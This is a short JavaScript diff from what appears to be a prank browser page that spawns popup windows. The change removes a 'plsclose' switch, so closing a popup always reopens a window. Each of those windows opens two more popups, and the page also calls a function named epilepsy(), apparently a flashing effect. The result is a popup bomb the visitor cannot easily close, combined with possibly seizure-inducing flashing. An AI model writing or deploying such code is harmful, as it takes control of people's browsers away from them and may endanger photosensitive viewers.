@@ -55,7 +55,6 @@
     onchange({type: document[hidden] ? "blur" : "focus"})
 })();
         
-        window.plsclose = 'no'
         window.clone = new URLSearchParams(window.location.search).get('popup') || 'main'
         
         function interval() {
@@ -91,9 +90,7 @@
             var popupTick = setInterval(function () {
                 if (popup.closed) {
                     clearInterval(popupTick);
-                    if (window.plsclose == "no") {
-                        openNew('safe')
-                    }
+                    openNew('safe')
                 }
             }, 100)
 
@@ -101,14 +98,14 @@
         }
         
         // Check the state of the window.
-        function init(purpose) {
-            epilepsy()
+        function init() {
             if (window.clone === 'main') {
-                openNew('safe', purpose)
+                epilepsy()
+                openNew('safe')
             } else if (window.clone === 'safe') {
                 interval()
-                openNew('popup', purpose)
-                openNew('popup', purpose)
+                openNew('popup')
+                openNew('popup')
             } else {
                 interval()
             }
